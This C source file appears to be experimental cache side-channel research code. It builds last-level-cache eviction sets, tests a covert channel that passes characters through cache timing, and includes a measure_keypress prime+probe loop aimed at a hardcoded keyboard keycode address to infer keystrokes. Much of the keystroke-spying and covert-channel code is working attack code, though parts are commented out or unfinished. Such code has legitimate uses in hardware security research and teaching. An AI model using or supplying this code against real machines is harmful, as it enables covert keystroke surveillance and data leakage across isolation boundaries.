#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <x86intrin.h>

#include "../lib/constants.h"
#include "../lib/covert.h"
#include "../lib/eviction.h"
#include "../lib/utils.h"

#define TRIALS 1000
#define KBD_KEYCODE_ADDR 0x326d06b20
#define WAIT_INTERVAL 10000

void *mapping_start;

void handle_sigint(int sig) { munmap(mapping_start, EVERGLADES_LLC_SIZE << 4); }
void test_eviction_set(void) {
  uint8_t victim = 0x37;
  CacheLineSet *cl_set = new_cl_set();

  uint64_t threshold = threshold_from_flush(&victim);
  if (!get_minimal_set(&victim, &cl_set, threshold)) {
    printf("Error. Failed to generate minimal eviction set.\n");
  }

  // Bring the victim into the cache
  uint8_t var2 = victim ^ 0xF7;

  // Access eviction set
  NumList *timings = new_num_list(TRIALS);
  evict_and_time(cl_set, &victim, timings, true);

  // Report median and mean times
  printf("Timings after accessing eviction set:\n");
  print_stats(timings);

  int evictions = 0;

  for (int i = 0; i < TRIALS; i++) {
    if (timings->nums[i] > threshold) {
      evictions++;
    }
  }

  printf("Successfully evicted %u/%u trials.\n", evictions, TRIALS);

  deep_free_cl_set(cl_set);
  free_num_list(timings);
}

void test_covert_channel(void) {
  uint8_t *target = malloc(sizeof(uint64_t *));
  printf("target: %p\n", target);
  CacheLineSet *cl_set = new_cl_set();
  int threshold = threshold_from_flush(target);
  if (!get_minimal_set(target, &cl_set, threshold)) {
    printf("Error. Failed to generate minimal eviction set.\n");
  }

  EvictionSet *evset = new_eviction_set(cl_set);
  for (int i = 0; i < 26; i++) {
    char c = 'a' + i;
    char recv = 0;
    for (int j = 0; j < 8; j++) {
      int bit = c & 0x1;
      send_bit(bit, evset);
      recv += recv_bit(target, threshold) << j;
      printf("%d ", bit);
      c >>= 1;
    }
    printf("%c\n", recv);
  }
  // deep_free_cl_set(cl_set);
  // deep_free_es(evset);
}

void test_sliced_evset(void) {
  uint8_t *target = malloc(sizeof(uint8_t *));
  printf("target: %p\n", target);
  uintptr_t pa = pointer_to_pa(target);

  // map 64 2 MB pages to ge 256 candidate lines
  mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
  if (mapping_start == MAP_FAILED) {
    perror("map");
    return;
  }

  printf("memory mapped: %p\n", mapping_start);

  int threshold = threshold_from_flush(target);

  CacheLineSet *cl_set;
  // get_eviction_set_from_slices(pa, 16, &mapping_start, &cl_set);
  if (!get_minimal_set(target, &cl_set, threshold)) {
    printf("unable to obtain eviction set\n");
  }

  for (int i = 0; i < cl_set->size; i++) {
    printf("%p\n", cl_set->cache_lines[i]);
  }

  EvictionSet *es = new_eviction_set(cl_set);
  // uint8_t val = *target;
  // for (int i = 0; i < 2; i++) {
  //   for (int j = 0; j < 8; j++) {
  //     CacheLine forward = *(cl_set->cache_lines[j]);
  //   }
  //   for (int j = 0; j < EVERGLADES_ASSOCIATIVITY; j++) {
  //     if (j > 8) {
  //       CacheLine forward = *(cl_set->cache_lines[j]);
  //     }
  //     CacheLine lagging = *(cl_set->cache_lines[j]);
  //   }
  //   for (int j = 0; j < 8; j++) {
  //     CacheLine backward = *(cl_set->cache_lines[15 - j]);
  //   }
  //   for (int j = 0; j < EVERGLADES_ASSOCIATIVITY; j++) {
  //     if (j > 8) {
  //       CacheLine forward = *(cl_set->cache_lines[15 - j]);
  //     }
  //     CacheLine lagging = *(cl_set->cache_lines[15 - j]);
  //   }
  // }
  volatile uint8_t tmp = *target;
  access_set(es);
  int time = time_load(target);
  printf("threshold: %d, evict_time: %d\n", threshold, time);

  sleep(1);

  access_set(es);
  tmp = *target;
  CacheLine *iter = es->head;
  int access_times[EVERGLADES_ASSOCIATIVITY];
  for (int i = 0; i < es->size; i++) {
    access_times[i] = time_load((uint8_t *)iter);
    iter = iter->next;
  }

  for (int i = 0; i < EVERGLADES_ASSOCIATIVITY; i++) {
    printf("%d ", access_times[i]);
  }
  printf("\n");

  //   for (int j = 0; j < 10; j++) {
  //     for (int i = 0; i < 16; i++) {
  //       *(volatile uint8_t *)cl_set->cache_lines[i];
  //     }
  //     for (int i = 0; i < 16; i++) {
  //       *(volatile uint8_t *)cl_set->cache_lines[15 - i];
  //     }
  //
  //     *(volatile uint8_t *)target;
  //
  //     /* probe */
  //     unsigned int core_id = 0;
  //     uint64_t access_times[EVERGLADES_ASSOCIATIVITY];
  //     uint64_t general_time[EVERGLADES_ASSOCIATIVITY];
  //     for (int i = 0; i < EVERGLADES_ASSOCIATIVITY; i++) {
  //       general_time[i] = __rdtscp(&core_id);
  //       access_times[i] = time_load((volatile uint8_t
  //       *)cl_set->cache_lines[i]);
  //     }
  //
  //     for (int i = 0; i < EVERGLADES_ASSOCIATIVITY; i++) {
  //       printf("%ld ", access_times[i]);
  //     }
  //
  //     printf("\n");
  //   }
  //
  //   free(target);
  //   // deep_free_es(es);
  //   munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
}

void measure_keypress(uintptr_t pa) {
  printf("%p\n", (void *)pa);

  signal(SIGINT, handle_sigint);

  // map 64 * 2 MB pages to get 256 candidate lines
  mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
  if (mapping_start == MAP_FAILED) {
    perror("map");
    return;
  }

  printf("memory mapped: %p\n", mapping_start);

  CacheLineSet *cl_set;
  get_eviction_set_from_slices(pa, EVERGLADES_ASSOCIATIVITY, &mapping_start,
                               &cl_set);
  int threshold = threshold_from_flush(mapping_start);
  printf("cache threshold: %d\n", threshold);
  uint8_t value = 0;
  while (1) {

    value >>= 1;
    /* prime */
    for (int i = 0; i < EVERGLADES_ASSOCIATIVITY; i++) {
      *(volatile CacheLine *)cl_set->cache_lines[i];
    }
    for (int i = 0; i < EVERGLADES_ASSOCIATIVITY; i++) {
      *(volatile CacheLine *)
           cl_set->cache_lines[EVERGLADES_ASSOCIATIVITY - 1 - i];
    }

    /* busy wait for 10000 cycles */
    unsigned int core_id = 0;
    uint64_t wait_time_start = __rdtscp(&core_id);
    while (__rdtscp(&core_id) - wait_time_start < WAIT_INTERVAL)
      ;

    /* probe */
    uint64_t access_times[EVERGLADES_ASSOCIATIVITY];
    uint64_t general_time[EVERGLADES_ASSOCIATIVITY];
    for (int i = 0; i < EVERGLADES_ASSOCIATIVITY; i++) {
      general_time[i] = __rdtscp(&core_id);
      access_times[i] = time_load((volatile uint8_t *)(cl_set->cache_lines[i]));
    }

    for (int i = 0; i < EVERGLADES_ASSOCIATIVITY; i++) {
      printf("%ld ", access_times[i]);
    }

    printf("\n");

    /* evaluate and interpret result */
    int hit = 0;
    for (int i = 0; i < EVERGLADES_ASSOCIATIVITY; i++) {
      if (access_times[i] > threshold) {
        value += (1 << 7);
      }
    }

    // printf("%08x\n", value);
  }
}

int main() {
  // test_eviction_set();
  // test_covert_channel();
  test_sliced_evset();
  // FILE *inFile;
  // inFile = fopen("pa.txt", "r");
  // if (inFile == NULL) {
  //   perror("fopen");
  //   exit(1);
  // }
  //
  // uintptr_t pa;
  // fscanf(inFile, "%lx", &pa);
  // printf("%p\n", (void *)pa);
  // fclose(inFile);
  // measure_keypress(pa);
}
